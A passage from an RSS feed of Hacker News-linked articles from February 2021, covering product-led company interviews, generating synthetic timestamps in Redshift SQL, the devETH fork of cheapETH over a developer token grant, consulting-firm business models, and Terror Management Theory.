biggest indicator of whether this team is empowered. This is the motherlode. Plan to dig deep into this one. Pull every thread and see where it takes you.</p><h4 id="what-youre-looking-for">What you‚Äôre looking for<a href="#what-youre-looking-for"></a></h4><p>We want to see that leadership has assigned the team clear objectives ‚Äî customer or business problems to solve ‚Äî and empowered the team to come up with solutions to those problems. We‚Äôre looking to see that leadership has pointed the team in the right direction, and empowered them to figure it out.</p><p>We want to hear things like ‚Äúwell, our goal this quarter is to increase the average 4-week retention for a new user cohort from 33% to at least 40%. We interview users every week and dug into this pattern from last quarter‚Äôs data. The PM/designer/tech lead ran a fast series of prototypes/experiments to figure out what worked with users, and to make sure our stakeholders could support it. After we had enough confidence that it was the right thing to build, we put it on the backlog and built it out for production.‚Äù</p><p>What‚Äôs wrapped up in that statement? Tons of goodness:</p><ul><li>A clear goal, with metrics, that the whole team is focused on</li><li>A regular cadence of user/customer contact</li><li>Insights that inform the product strategy and shape the objectives the teams pursue</li><li>Rapid, iterative, and collaborative prototyping and continuous discovery practices</li><li>Addressing the <a href="https://svpg.com/four-big-risks/">four big risks</a> early on in discovery, before building for production</li><li>A collaborative, rather than subservient, relationship with stakeholders‚Äîwe hear that the product team exists to delight the customer, in a way that works for the business</li></ul><p>We‚Äôd also love to dig into the tradeoffs and tough calls that were made in that process. This is a place we‚Äôd love to hear the product vision and principles shaping the daily product decisions that the ‚Ä¶</p></div></article></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://andrewskotzko.com/how-to-know-if-youre-interviewing-at-a-product-led-company/">https://andrewskotzko.com/how-to-know-if-youre-interviewing-at-a-product-led-company/</a></em></p>]]>
            </description>
            <link>https://andrewskotzko.com/how-to-know-if-youre-interviewing-at-a-product-led-company/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26187334</guid>
            <pubDate>Thu, 18 Feb 2021 23:31:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generating realistic user timestamps in SQL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26187291">thread link</a>) | @cedricd
<br/>
February 18, 2021 | https://blog.narrator.ai/generating-random-timestamps-in-sql/ | <a href="https://web.archive.org/web/*/https://blog.narrator.ai/generating-random-timestamps-in-sql/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p><em>Photo by <a href="https://unsplash.com/@loic?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Djim Loic</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></em></p><p>This is the second in a three part series showing how we generate interesting fake data to demo Narrator. <a href="https://blog.narrator.ai/how-to-generate-a-series-of-numbers-in-redshift/">Part 1</a> described how to create a numbers table.</p><p>Generating time series data can extremely useful for testing, debugging, and demoing. For example, whenever we demo Narrator's data platform we show generated data from a fake company. The data is all generated by creating user events at specific (randomish) times. Creating realistic timestamps is at the core of this process.</p><p>Unfortunately, creating realistic synthetic timestamps in SQL is pretty unintuitive. Postgres has a neat <code><a href="https://dataschool.com/learn-sql/generate-series/">generate_series()</a></code> function that can create timestamps, but it'll create them evenly (which is <a href="https://popsql.com/learn-sql/postgresql/how-to-use-generate-series-to-avoid-gaps-in-data-in-postgresql">quite useful</a>, but not what we want).</p><p>Here we'll show how we create timestamps that follow reasonable usage patterns. We'll start with a simple case and build it up bit by bit.</p><blockquote>The code below will all be for Redshift. It should be straightforward to convert to any other warehouse.</blockquote><p>The basic process is to pick a target start and end date, the number of timestamps needed, and use a numbers table to select the right number of rows. From there a little math will create timestamps in that interval with the properties we want.</p><h2 id="random-timestamps">Random Timestamps</h2><p>The first step is to create timestamps evenly spread throughout our time interval.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>The code above is not too bad. It creates timestamps on a per-minute basis. The timestamps are is random so there's no truly obvious pattern.</p><figure><img src="https://blog.narrator.ai/content/images/2021/02/image.png" alt="" srcset="https://blog.narrator.ai/content/images/size/w600/2021/02/image.png 600w, https://blog.narrator.ai/content/images/size/w1000/2021/02/image.png 1000w, https://blog.narrator.ai/content/images/2021/02/image.png 1596w" sizes="(min-width: 720px) 720px"></figure><p>Well, there is one obvious pattern ‚Äì the slope is perfectly straight. That's not super realistic. Let's try modeling usage increasing over time.</p><h2 id="increasing-timestamps">Increasing Timestamps</h2><p>Let's assume our timestamps represent user activity ‚Äì say website sessions. Over time this usage is going to increase, so we should have our synthetic timestamps follow that. </p><p>An <a href="https://en.wikipedia.org/wiki/Exponential_growth">exponential</a> function is a great one to follow, since it measures compounding growth. It's generally of the form </p><figure><img src="https://www.gstatic.com/education/formulas2/355397047/en/exponential_growth_formula.svg" alt="f(x)=a(1+r)^{x}"></figure><!--kg-card-begin: markdown--><p>We'll use the form f(x) = r<sup>x</sup> for simplicity's sake. For example, 2<sup>x</sup> looks like this:</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.narrator.ai/content/images/2021/02/image-2.png" alt="" srcset="https://blog.narrator.ai/content/images/size/w600/2021/02/image-2.png 600w, https://blog.narrator.ai/content/images/size/w1000/2021/02/image-2.png 1000w, https://blog.narrator.ai/content/images/2021/02/image-2.png 1354w" sizes="(min-width: 720px) 720px"><figcaption>exponential function with base 2</figcaption></figure><p>This models the hockey-stick growth all startups want to see and is actually a fairly good representation of actual user growth. </p><p>So the problem is how to generate timestamps that follow a function. The code to do this isn't too crazy:</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Which looks like this:</p><figure><img src="https://blog.narrator.ai/content/images/2021/02/image-3.png" alt="" srcset="https://blog.narrator.ai/content/images/size/w600/2021/02/image-3.png 600w, https://blog.narrator.ai/content/images/size/w1000/2021/02/image-3.png 1000w, https://blog.narrator.ai/content/images/2021/02/image-3.png 1554w" sizes="(min-width: 720px) 720px"></figure><p>So what's going on?</p><!--kg-card-begin: markdown--><p>First we're using the function 2<sup>x</sup> - 1 to generate a y value between 0 and 1 for x between 0 and 1. This simplifies things a lot. We'll deal with values not between 0 and 2 in the next section</p>
<!--kg-card-end: markdown--><p>So we have <code>random() as x</code> and <code>2^x - 1 as y</code> </p><p>The main difference from before is that we'll use <code>y</code> instead of <code>x</code> to create the actual timestamp value. </p><p>We also offset y from the end of the time period instead of the beginning. This is because for early dates the values of y are more similar to each other (the flatter part of the curve). That means in a given time span (say a day) there are more of them, making the curve trend down. Negating y this way basically mirrors the graph around the y axis and solves that issue.</p><h2 id="adjusting-the-output">Adjusting the Output</h2><p>That looks nice, but what if we want to more carefully control the function we're using? For example, let's make the graph much steeper. To do this we just have to change the function. </p><!--kg-card-begin: markdown--><p>For an exponential function we'll get a steeper curve if we give the growth rate a higher number: going from f(x) = 2<sup>x</sup> to say f(x) = 5<sup>x</sup>. Pretty straightforward.</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.narrator.ai/content/images/2021/02/image-4.png" alt="" srcset="https://blog.narrator.ai/content/images/size/w600/2021/02/image-4.png 600w, https://blog.narrator.ai/content/images/size/w1000/2021/02/image-4.png 1000w, https://blog.narrator.ai/content/images/2021/02/image-4.png 1302w" sizes="(min-width: 720px) 720px"><figcaption>Plot of 2<sup>x</sup> (red) and 5<sup>x</sup> (blue)</figcaption></figure><p>In the last section we crafted our function so that for all values of <code>x</code> from 0..1 <code>y</code> is also between 0..1. That simplification won't be possible this time, so we'll have an additional step where we scale <code>y</code> back down. </p><p>Here it is</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>The code is nearly the same. We just have to do a simple linear interpolation of <code>y</code> to get it between 0 and 1. </p><p>It's fairly easy to see the graph is now steeper, and that there are fewer timestamps earlier, and more timestamps later, than before.</p><figure><img src="https://blog.narrator.ai/content/images/2021/02/image-7.png" alt="" srcset="https://blog.narrator.ai/content/images/size/w600/2021/02/image-7.png 600w, https://blog.narrator.ai/content/images/size/w1000/2021/02/image-7.png 1000w, https://blog.narrator.ai/content/images/2021/02/image-7.png 1502w" sizes="(min-width: 720px) 720px"></figure><h2 id="incremental-creation"><br>Incremental Creation</h2><p>This is great at creating a whole set of timestamps, but what if you want to create them a bit at a time? We do this with our demo account ‚Äì every day we add new user events based on these timestamps to make the demo look like it's live and up to date.</p><p>In the examples above we generated timestamps between some time in the past and now. This won't work for incremental generation, since subsequent days won't line up. Picking 24 hours ago and now as the two endpoints will give a discontinuity as each new day effectively starts the curve over.</p><p>The simplest way to have one overarching curve across multiple runs is to fix both the start and end dates. In other words, pick a future date for the end and stick to it (say 5 years in the future). From there simply filter on timestamp in the select query to generate the date range you need</p><pre><code>select
    date_trunc('day', ts)::date AS day,
    count(1) as total_timestamps
from quickly_increasing_timestamps
where ts &gt; '2021-02-02'::timestamp and ts &lt; 2021-02-03'::timestamp
group by day
order by day asc</code></pre><h2 id="wrapping-up">Wrapping Up</h2><p>There it is. A nice set of auto-generated timestamps that follow any curve we'd like. In a future post we'll dive into how we use these synthetic timestamps to build out an entire set of realistic customer behaviors. </p>
                </div>
            </section></div>]]>
            </description>
            <link>https://blog.narrator.ai/generating-random-timestamps-in-sql/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26187291</guid>
            <pubDate>Thu, 18 Feb 2021 23:26:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Some Background (On CheapETH)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26187156">thread link</a>) | @lumpa
<br/>
February 18, 2021 | https://www.deveth.org/background.html | <a href="https://web.archive.org/web/*/https://www.deveth.org/background.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

  <nav>
    <div>
      <p><a href="https://www.deveth.org/"><img src="https://www.deveth.org/logo.png" alt="deveth.org" width="110"></a>
      </p>
    </div>
  </nav>

  <main>
    

    <p>In February 2021, George Hotz (geohot) et al. <a href="https://github.com/cheapETH/go-ethereum/tree/cheapeth">forked the Ethereum chain</a> to form <a rel="nofollow" href="https://cheapeth.org/">cheapETH</a>. A project intended to provide a stable, affordable
      testnet for the
      Ethereum ecosystem, with cross-chain communication functionality. The founders of the devETH project participated
      in this community, spending time and resources building infrastructure surrounding the project.</p>
    <p>Unfortunately, days after the project was started, a member of the cheapETH community discovered and pointed out
      <a href="https://github.com/cheapETH/go-ethereum/commit/412c38434d8d88840452c090e738a672139a73d4#diff-67b4f96b9bd587cc5f508f38eb63f372fa31f339bf66fedcb188f78774318201R88">patch</a>
      in the cheapETH fork of go-ethereum, that grants 25,000,000 cheapETH tokens to the developers associated with the
      project. According to the <a href="https://github.com/cheapETH/cheapeth-website/blob/442027739ee61444c711346c7e3b2a06aecd94aa/index.html#L93">cheapETH
        website</a>, that would theoretically amount to 25,000 Ethereum as per the pegged 1/1000 ratio described by the
      cheapETH developers. This single transaction has <b>theoretical</b> market value of $46 million USD at the time of
      writing. (Feb 18th)
    </p>
    <p>Following this revelation on the cheapETH Discord server, a number of community members expressed their concern
      regarding this seemingly gratuitous developer fund, and the details surrounding its implementation. Instead of
      addressing these issues, the cheapETH staff appointed in the Discord community resorted to deleting messages and
      banning members of the community who were posing unwanted questions about the financial motivations of the
      cheapETH project.</p>
    <p>The devETH project authors do not intend to make any assumptions/accusations as to the financial
      dealings/motivations of the cheapETH developers - They are free to do whatever they wish with their project.
      However, prompted by the drastic response in the Discord community, and a suggestion by <a href="https://github.com/cheapETH/go-ethereum/pull/2#issuecomment-779544030">George Hotz</a>, a group of
      cheapETH community members decided to launch the devETH project as a direct fork of the cheapETH project.</p>
    <p>We intend to continue innovating on the vision of the cheapETH project, and wish all the best to the cheapETH
      team on their endeavour.</p>
    <p>The devETH team invites anyone interested in our take on the cheapETH vision to participate in our <a href="https://discord.gg/xFmCcaEjPK">Discord server</a>.</p>
    <p>- The devETH team</p>

  </main>

  
  


</div>]]>
            </description>
            <link>https://www.deveth.org/background.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26187156</guid>
            <pubDate>Thu, 18 Feb 2021 23:12:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Consulting Business Model]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26187118">thread link</a>) | @shoo
<br/>
February 18, 2021 | https://commoncog.com/blog/the-consulting-business-model/ | <a href="https://web.archive.org/web/*/https://commoncog.com/blog/the-consulting-business-model/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <section>
        <p>In Singapore, and Malaysia, and India, and Vietnam, if you‚Äôre a young software engineer fresh out of college, you have effectively three choices for a first job:</p><ul><li>You can go work for a product company, one where the tech is the focus. This is most likely a startup. (Unlike in Silicon Valley, there are rather limited opportunities for established tech companies in these countries).</li><li>You can go work in the IT department of some non-tech company, like Bosch, or Citibank, or AIA.</li><li>Or you can go work for an outsourcing / professional service firm.</li></ul><p>That last option is a really big one. A large portion of tech company jobs I know in Vietnam, Singapore and Malaysia come from some consulting firm. Those firms exist on a spectrum. At the bottom are the pure outsourcing companies ‚Äî the ones that treat its employees like so much gristle to be fed to a meat grinder. At the top are the premier consulting companies ‚Äî the <a href="https://pivotal.io/labs">Pivotals</a> and the <a href="https://eastagile.com/">East Agiles</a> of their respective markets. And there are, of course, a plethora of consulting firms in between; I know more than a dozen friends who have elected to start consulting firms. I even ran one for a year.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>All of this is to say that I‚Äôm just really, really interested in the business of consulting. And I think I should be: in Asia, software consulting continues to make up a large proportion of tech jobs. You simply can‚Äôt ignore them if you work in the industry.</p><p>(The same goes for accounting and law and media, financial advisories and estate planning and ad agencies, real estate brokers and PR firms and investment banks. There are whole industries where the primary employer is a professional service firm).</p><p>Professional service firms are interesting businesses. They don't own assets. They own labour. They don't manufacture things (for the most part). They charge a multiple of their people‚Äôs time costs. As a result, they have <em>very</em> different takes on profitability, company growth, and employee retention. If you want to work for one, you damn well better know how they work.</p><!--kg-card-begin: markdown--><!--kg-card-end: markdown--><p>I was faffing around on Goodreads three weeks ago when I stumbled upon David Maister‚Äôs <em>Managing the Professional Service Firm</em>. Maister was a former Harvard Business School professor and consultant; <em>Managing the Professional Service Firm</em> was written as a series of articles over the course of the 80s ‚Äî the majority of which were published in <em>American Lawyer</em>.</p><p>Maister‚Äôs book is incredible. The first two chapters lay out the underlying principles of a professional service business. The rest of the book examines the second and third-order implications of those principles ‚Äî and form the basis of a highly effective agency management style.</p><p>I want to summarise the first two chapters of Maister‚Äôs book here. I <em>can‚Äôt</em> do more than that; Maister‚Äôs book is a <a href="https://commoncog.com/blog/the-3-kinds-of-non-fiction-book/#treebooks">üå≥ tree book</a>, which makes it impossible to summarise. But I think the core principles are worth writing about ‚Äî if you‚Äôre considering a job in a professional service firm, you‚Äôll probably find these two chapters the most useful.</p><h2 id="maisters-s-core-thesis">Maisters‚Äôs Core Thesis</h2><p>Maister‚Äôs core thesis is this:</p><p>Professional service firms must be managed differently from industrial and mass-consumer businesses. This is due to two reasons. First, professional service firms perform highly customised work. This makes the application of product management (or manufacturing) principles a bad fit for them.</p><p>Second, professional service firms require a healthy component of face-to-face client interaction. The top performers must have special client-facing skills, which in turn places a heavy burden on the firm to recruit and train the best people in your field <em>with</em> such client-management skills (if you‚Äôre familiar with Joe Average Programmer, you should know that this is a lot harder than it sounds). In turn, this forces the professional firm to actively compete in two markets: the ‚Äòinput‚Äô market for talent, and the ‚Äòoutput‚Äô market for its services.</p><p>Maister writes:</p><blockquote>‚Ä¶ while it is clear that the management problems of professional firms are sufficiently different from industrial or mass-consumer businesses to require their own ‚Äúmanagement theory‚Äù; it is also clear that, in spite of many differences, businesses within the professional service sector face very similar issues, regardless of the specific profession they are in. When I began my work, I treated these propositions as hypotheses. Ten years, many professions, and countless firms later, I take them as confirmed facts.</blockquote><p><em>My</em> thesis is that an understanding of underlying business models leads to better career decisions. So. What does that ‚Äòmanagement theory‚Äô consist of?</p><h3 id="all-professional-service-firms-have-the-same-mission">All Professional Service Firms Have The Same Mission</h3><p>The first is Maister‚Äôs observation that <em>all</em> professional services firms seem to have the exact same mission:</p><blockquote>‚ÄúTo deliver outstanding client service; to provide fulfilling careers and professional satisfaction for our people; and to achieve financial success so that we can reward ourselves and grow.‚Äù</blockquote><p>It doesn‚Äôt matter if the firm is large or small, if it‚Äôs located in America or Japan, or if it‚Äôs investment banking or law. The words of the mission may differ but the meaning is essentially same.</p><figure><img src="https://commoncog.com/blog/content/images/2019/08/Paper.Commonplace.48.png" alt=""><figcaption>The three universal goals of every professional service firm.</figcaption></figure><p>It‚Äôs no coincidence that these three goals are so universal to professional service firms. As it turns out, such firms <em>must</em> balance between the demands of the client marketplace, the realities of the talent marketplace, and the firm‚Äôs economic ambitions if they are to survive.</p><p>What this means, exactly, will become clear in a minute.</p><h3 id="the-most-important-managing-decision-is-the-firm-s-leverage">The Most Important Managing Decision is the Firm‚Äôs Leverage</h3><p>When in pursuit of the three goals, the <strong>most important factor</strong> the firm must manage is its ratio of junior, mid-level, and senior staff members in the firm‚Äôs organisation. Maister calls this ratio the ‚Äòleverage‚Äô of the firm.</p><p>The archetypical professional service firm consist of three levels. They‚Äôre often called ‚Äògrinders‚Äô, ‚Äòminders‚Äô, and ‚Äòfinders‚Äô. This is true for law firms (associate, junior partner, senior partner), management consultancies (junior consultant, manager, vice president), investment bankers (analyst, associate, vice president, director ‚Äî though analysts don't really count) and so on.</p><p>The ratio of junior, mid-level, and senior staff members make up the ‚Äòshape‚Äô of the firm ‚Äî and the shape of the firm <em>should</em> be determined by the skill requirements of the work it does.</p><p>Maister points out that there are three ‚Äòtypes‚Äô of client work (in reality, as with most things, these points exist on a spectrum). The client work is determined by the market, but the <em>mix</em> of project types is up to the firm.</p><p>I‚Äôve mentioned this in my <a href="https://commoncog.com/blog/you-cant-ignore-business-models-in-your-career/#the-joys-and-limitations-of-working-for-a-consultancy">previous post on business models</a>, but here it is again:</p><ol><li><strong>Brain projects.</strong> ‚ÄúIn the first type (Brains), the client‚Äôs problem is at the forefront of professional or technical knowledge, or at least is of extreme complexity. The key elements of this type of professional service are creativity, innovation, and the pioneering of new approaches, concepts or techniques: in effect, new solutions to new problems. The firm that targets this market will be attempting to sell its services on the basis of the high professional craft of its staff. In essence, their appeal to their market is, ‚ÄúHire us because we‚Äôre smart.‚Äù</li><li><strong>Grey Hair projects.</strong> ‚ÄúGrey Hair projects, while they may require a highly customized ‚Äúoutput‚Äù in meeting the clients‚Äô needs, involve a lesser degree of innovation and creativity in the actual performance of the work than would a Brains project. The general nature of the problem to be addressed is not unfamiliar, and the activities necessary to complete the project may be similar to those performed on other projects. Clients with Grey Hair problems seek out firms with experience in their particular type of problem. In turn, the firm sells its knowledge, its experience, and its judgment. In effect, they are saying, ‚ÄúHire us because we have been through this before; we have practice at solving this type of problem.‚Äù</li><li><strong>Procedure projects.</strong> ‚ÄúThe third type of project, the Procedure project, usually involves a well-recognized and familiar type of problem. While there is still a need to customize to some degree, the steps necessary to accomplish this are somewhat programmatic. The client may have the ability and resources to perform the work itself, but turns to the professional firm because the firm can perform the service more efficiently, because the firm is an outsider, or because the client‚Äôs own staff capabilities to perform the activity are somewhat constrained and are better used elsewhere. In essence, the professional firm is selling its procedures, its efficiency, its availability: ‚ÄúHire us because we know how to do this and can deliver it effectively.‚Äù</li></ol><p>The labour demands for each project are ordered in descending fashion: ‚ÄòBrain‚Äô projects require experienced, senior staff, as nearly everything is custom-made for the client. ‚ÄòGrey Hair‚Äô projects address problems that are more familiar, and thus provide some opportunity for delegation. ‚ÄòProcedure‚Äô projects involve the highest proportion of junior time relative to senior time, and thus demand a completely different shape for firms that specialise in such projects.</p><p>The mix of projects that the firm undertakes is hugely influential on <em>many</em> aspects of the firm‚Äôs operations. Maister writes:</p><!--kg-card-begin: markdown--><blockquote>
<p>Consider what will happen if a firm brings in a mix of client work such that its ‚Äúproper‚Äù staffing requirements would be for a slightly higher mix of juniors, and a lesser mix of seniors than it has (i.e., the work is slightly more procedural than the firm would normally expect). What will happen?</p>
<p><img src="https://commoncog.com/blog/content/images/2019/08/Paper.Commonplace.49.png" alt="Paper.Commonplace.49"></p>
<p>As Figure 1‚Äì2 suggests, the short-run consequence will be that higher priced people will end up performing lower-value tasks (probably at lower fees), and there will be an underutilization of senior personnel. The firm will make less money than it should be making.</p>
<p><img src="https://commoncog.com/blog/content/images/2019/08/Paper.Commonplace.50.png" alt="Paper.Commonplace.50"></p>
<p>The opposite problem is no less real. If a firm brings in work that has skill requirements of a higher ‚Ä¶</p></blockquote></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://commoncog.com/blog/the-consulting-business-model/">https://commoncog.com/blog/the-consulting-business-model/</a></em></p>]]>
            </description>
            <link>https://commoncog.com/blog/the-consulting-business-model/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26187118</guid>
            <pubDate>Thu, 18 Feb 2021 23:08:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Kanban board that helps Engineers learn Marketing]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26186864">thread link</a>) | @krm01
<br/>
February 18, 2021 | https://phireworks.co/pro/?pro | <a href="https://web.archive.org/web/*/https://phireworks.co/pro/?pro">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<table>
  <tbody><tr>
    <td>

      <h3>Examples from real companies. </h3>
      <h4>New marketing ideas are constantly added to your dashboard so you can learn how other founders acquired their first set of customers.</h4>
    </td>

    <td>

      <h3>Drag &amp; drop to organize</h3>
      <h4>Organize and prioritize weekly marketing experiments that you can implement yourself. Design your process for consistent growth.</h4>
    </td>

    <td>

      <h3>Practical and actionable guides</h3>
      <h4>Discover practical marketing ideas without the fluff, so you can save time and start implementing right away.  </h4>
    </td>
  </tr>
</tbody></table>





</div></div>]]>
            </description>
            <link>https://phireworks.co/pro/?pro</link>
            <guid isPermaLink="false">hacker-news-small-sites-26186864</guid>
            <pubDate>Thu, 18 Feb 2021 22:44:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Terror Management Theory]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26186711">thread link</a>) | @spekcular
<br/>
February 18, 2021 | https://ernestbecker.org/resources/terror-management-theory/ | <a href="https://web.archive.org/web/*/https://ernestbecker.org/resources/terror-management-theory/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article id="post-60" class="page">
  <div>
    
<h2>Terror Management Theory</h2>
<p><iframe src="https://www.youtube.com/embed/Joalg73L_gw" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe><br>Terror Management Theory (TMT) was developed in 1986 by social psychologists Jeff Greenberg, Tom Pyszczynski, and Sheldon Solomon based upon Ernest Becker‚Äôs ideas.</p>
<p>TMT posits that while humans share with all life-forms a biological predisposition toward self-preservation in the service of reproduction, we are unique in our capacity for symbolic thought, which fosters self-awareness and the ability to reflect on the past and ponder the future. This spawns the realization that death is inevitable and can occur at any time for reasons that cannot be anticipated or controlled.</p>
<p><strong>The awareness of death engenders potentially debilitating terror that is ‚Äúmanaged‚Äù by the development and maintenance of cultural worldviews:</strong> humanly constructed beliefs about reality shared by individuals that minimize existential dread by conferring meaning and value. All cultures provide a sense that life is meaningful by offering an account of the origin of the universe, prescriptions for appropriate behavior, and assurance of immortality for those who behave in accordance with cultural dictates. <strong>Literal immortality is afforded by souls, heavens, afterlives, and reincarnations associated with all major religions. Symbolic immortality is obtained by being part of a great nation, amassing great fortunes, noteworthy accomplishments, and having children.</strong></p>
<p>Psychological equanimity also requires that individuals perceive themselves as persons of value in a world of meaning. This is accomplished through social roles with associated standards. Self-esteem is the sense of personal significance that results from meeting or exceeding such standards.</p>
<p>Three lines of research provide empirical support for TMT:</p>
<div>
<ul>
<li>The anxiety-buffering function of self-esteem is established by studies where <strong>momentarily elevated self-esteem results in lower self-reported anxiety</strong> and physiological arousal.</li>
<li>Making death salient by asking people to think about themselves dying (or viewing graphic depictions of death, being interviewed in front of a funeral parlor, or subliminal exposure to the word ‚Äúdead‚Äù or ‚Äúdeath‚Äù) <strong>intensifies strivings to defend their cultural worldviews</strong> by increasing positive reactions to similar others, and negative reactions toward those who are different.</li>
<li>Research verifies the existential function of cultural worldviews and self-esteem by demonstrating that <strong>non-conscious death thoughts come more readily to mind when cherished cultural beliefs or self-esteem is threatened</strong>.</li>
</ul>
</div>
<p>TMT has generated empirical research (currently more than 500 studies) examining a host of other forms of human social behavior, including aggression, stereotyping, needs for structure and meaning, depression and psychopathology, political preferences, creativity, sexuality, romantic and interpersonal attachment, self-awareness, unconscious cognition, martyrdom, religion, group identification, disgust, human-nature relations, physical health, risk taking, and legal judgments.</p>
<p>In 2015, Greenberg, Pyszczynski and Solomon published <a href="http://www.amazon.com/Worm-Core-Role-Death-Life/dp/1400067472/ref=sr_1_1?ie=UTF8&amp;qid=1442374782&amp;sr=8-1&amp;keywords=the+worm+at+the+core" target="_blank" rel="noopener noreferrer"><em>The Worm at the Core</em></a>, which reviews this vast body of research supporting Becker‚Äôs central claim that the fear of death is ‚Äúthe mainspring of human activity.‚Äù</p>
<p><strong>Related Books</strong><br>

<a target="_blank" href="https://www.elsevier.com/books/handbook-of-terror-management-theory/routledge/978-0-12-811844-3" rel="noopener noreferrer">Handbook of Terror Management Theory</a> (This is the most up-to-date anthology on TMT research)<br>

<a href="http://www.amazon.com/In-Wake-9-11-Psychology-Terror/dp/1557989540" target="_blank" rel="noopener noreferrer">In the Wake of 9/11: The Psychology of Terror</a><br><a href="http://www.guilford.com/books/Handbook-of-Experimental-Existential-Psychology/Greenberg-Koole-Pyszczynski/9781593850401" target="_blank" rel="noopener noreferrer">The Handbook of Experimental Existential Psychology</a></p>
<p><strong>Resources</strong><br>
<a href="http://www.tmt.missouri.edu/" target="_blank" rel="noopener noreferrer">TMT Website</a><br><a href="http://www.imdb.com/title/tt0365215/" target="_blank" rel="noopener noreferrer">Flight From Death</a></p>
<p><strong>Reviews of <em>The Worm at the Core</em></strong><br><a href="http://www.theguardian.com/books/2015/jul/31/the-worm-at-the-core-on-the-role-of-death-in-life-solomon-greenberg-pyszczynski-review" target="_blank" rel="noopener noreferrer">The Guardian, July 31, 2015</a><br><a href="http://www.newstatesman.com/culture/books/2015/09/why-cant-we-stop-death?utm_content=bufferddfd2&amp;utm_medium=social&amp;utm_source=facebook.com&amp;utm_campaign=buffer" target="_blank" rel="noopener noreferrer">New Statesman, September 1, 2015</a><br><a href="http://www.nationalinterest.org/feature/how-the-fear-death-changes-you-13658?utm_content=buffer4bbe3&amp;utm_medium=social&amp;utm_source=facebook.com&amp;utm_campaign=buffer" target="_blank" rel="noopener noreferrer">The National Interest, August 24, 2015</a><br><a href="http://chronicle.com/article/Mortal-Motivation/230303/" target="_blank" rel="noopener noreferrer">The Chronicle, May 22, 2015</a><br><a href="http://www.theatlantic.com/health/archive/2015/05/what-good-is-thinking-about-death/394151/" target="_blank" rel="noopener noreferrer">The Atlantic, May 28, 2015</a></p>


<p><strong>Songs About Becker/TMT</strong><br>

<a href="https://www.youtube.com/watch?v=BfdT3YR4RKk" target="_blank" rel="noopener noreferrer"><span>KALI‚ÄîTerror Management Theory</span></a><br>

<a href="https://boobsofdoom.bandcamp.com/album/13-terror-management-theory" target="_blank" rel="noopener noreferrer">Boobs of Doom‚ÄîTerror Management Theory</a><br>

<a href="https://canoncorerecords.bandcamp.com/track/terror-management-theory" target="_blank" rel="noopener noreferrer"><span>Skyline + Seluekos‚ÄîTerror Management Theory</span></a><br>

<a href="https://www.youtube.com/watch?v=QoK06y4dIfo" target="_blank" rel="noopener noreferrer">Under Threat‚ÄîTerror Management Theory<br>

</a><a href="https://www.youtube.com/watch?v=GhYxp8OtUOU" target="_blank" rel="noopener noreferrer">Hallucinogenius‚ÄîTerror Management Theory</a><br>

<a href="https://soundcloud.com/abadgeoffriendship/3-outblinker-ernest-becker" target="_blank" rel="noopener noreferrer">Outblinker‚ÄîErnest Becker</a><br>

<a href="https://richaucoin.bandcamp.com/album/release" target="_blank" rel="noopener noreferrer">Rich Aucoin‚ÄîRelease (entire album)</a><br>
<em>‚ÄúIt was originally to be called Death Release and is largely based around the work of psychologist Ernest Becker‚Äôs Denial of Death and his students‚Äô follow-up The Worm At The Core and terror management theory.‚Äù</em>
<a target="_blank" href="https://www.house-music.co/2019/06/rich-aucoin-shares-video-for-base-from.html" rel="noopener noreferrer">https://www.house-music.co/2019/06/rich-aucoin-shares-video-for-base-from.html</a>




</p>
    
      </div>
  <!--end entry-content-->

</article>
<!-- end post-60 --></div></div>]]>
            </description>
            <link>https://ernestbecker.org/resources/terror-management-theory/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26186711</guid>
            <pubDate>Thu, 18 Feb 2021 22:33:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Texas power outage is a nation-wide problem]]>
            </title>
            <description>
<![CDATA[
Score 290 | Comments 486 (<a href="https://news.ycombinator.com/item?id=26186645">thread link</a>) | @gwoplock
<br/>
February 18, 2021 | https://garrettbattaglia.com/post/texas-power/ | <a href="https://web.archive.org/web/*/https://garrettbattaglia.com/post/texas-power/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
